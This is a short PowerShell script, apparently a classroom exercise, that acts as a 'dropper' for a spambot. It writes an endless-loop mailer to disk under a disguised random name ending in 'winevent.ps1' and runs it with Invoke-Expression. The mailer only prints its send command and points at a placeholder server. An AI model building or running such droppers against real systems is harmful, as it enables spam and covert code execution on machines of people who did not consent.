<# 
    Storyline: Dropper for our spambot that will save to a directory and then execute it.
#>

$writeSbBot = @'
# Send an email using Powershell
$toSend = @('blaise.notter@mymail.champlain.edu')

# Message Body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

while($true) {

    foreach($email in $toSend){
        
        # Send the email
        write-host "Send-MailMessage -From 'blaise.notter@mymail.champlain.edu' -To $email -Subject 'Tisk Tisk' `
        -Body $msg -SmtpServer X.X.X.X"
        
        # Pause for one second
        start-sleep 1
    }
}
'@

# Directory to write the bot
$sbDir = 'C:\Users\blais\SYS320\SYS320-SP22\'

# create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save the bot
# C:\Users\blais\SYS320\SYS320-SP22
$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file
$writeSbBot | Out-File -FilePath $file 

# Executes the PowerShell script
Invoke-Expression $file
